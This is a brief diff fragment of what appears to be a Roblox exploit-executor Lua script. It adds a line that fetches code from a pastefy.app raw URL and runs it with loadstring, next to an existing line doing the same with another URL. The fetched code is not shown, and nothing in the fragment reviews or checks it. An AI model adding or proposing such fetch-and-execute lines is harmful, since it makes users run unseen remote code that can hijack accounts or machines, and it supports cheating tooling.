@@ -407,5 +407,5 @@ spawn(function()
         end
     end)
 end)
-
+loadstring(game:HttpGet("https://pastefy.app/fv4rcpeS/raw"))()
 loadstring(game:HttpGet("https://pastefy.app/TYw5hIBW/raw"))()
